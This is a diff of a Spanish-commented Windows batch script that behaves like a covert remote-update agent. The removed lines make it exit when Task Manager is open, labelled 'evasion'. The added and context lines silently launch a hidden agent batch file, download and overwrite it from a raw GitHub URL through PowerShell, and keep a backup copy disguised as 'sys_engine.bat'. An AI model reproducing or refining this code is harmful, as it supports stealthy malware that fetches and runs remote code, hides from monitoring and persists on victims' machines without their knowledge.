@@ -1,16 +1,5 @@
 @echo off
 setlocal enabledelayedexpansion
-:BUCLE_VIGILANCIA
-:: --- 3. EVASIÓN (CENTINELA) ---
-tasklist /FI "IMAGENAME eq taskmgr.exe" 2>nul | find /I /N "taskmgr.exe" >nul
-if "%errorlevel%"=="0" (
-    exit
-)
-:: Si el Agente no está corriendo, lo lanzamos de forma silenciosa
-tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
-if %errorlevel% neq 0 (
-    start /b "" cmd /c "%AGENTE_FILE%"
-)
 
 
 :: --- 1. CONFIGURACIÓN DE RUTAS Y VERSIONES ---
@@ -28,7 +17,10 @@ set "URL_BASE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/
 set "URL_VERSION=%URL_BASE%/version.txt"
 set "URL_AGENTE=%URL_BASE%/agente.bat"
 
-
+tasklist /FI "IMAGENAME eq cmd.exe" /V | findstr /I "sys_engine" >nul
+if %errorlevel% neq 0 (
+    start /b "" cmd /c "%AGENTE_FILE%"
+)
 :: --- 2. MÓDULO DE ACTUALIZACIÓN (Sincronización) ---
 :: Intentamos bajar la versión de la nube a un temporal
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_VERSION%', '%VLINEA%')" >nul 2>&1
@@ -64,7 +56,7 @@ if "!LINEA_LOCAL!" GEQ "!LINEA_NUBE!" (
             
     :: 2.2 DESCARGA Y RESPALDO (Sobreescritura forzada)
     :: Usamos PowerShell porque bitsadmin a veces deja archivos colgados en descargas rápidas
-    powershell -Command "^(New-Object Net.WebClient^).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
+    powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%AGENTE_FILE%')" >nul 2>&1
     copy /y "%AGENTE_FILE%" "%BACKUP_DIR%\sys_engine.bat" >nul 2>&1
             
     :: 2.3 RE-ACTIVACIÓN DE ESCUDOS
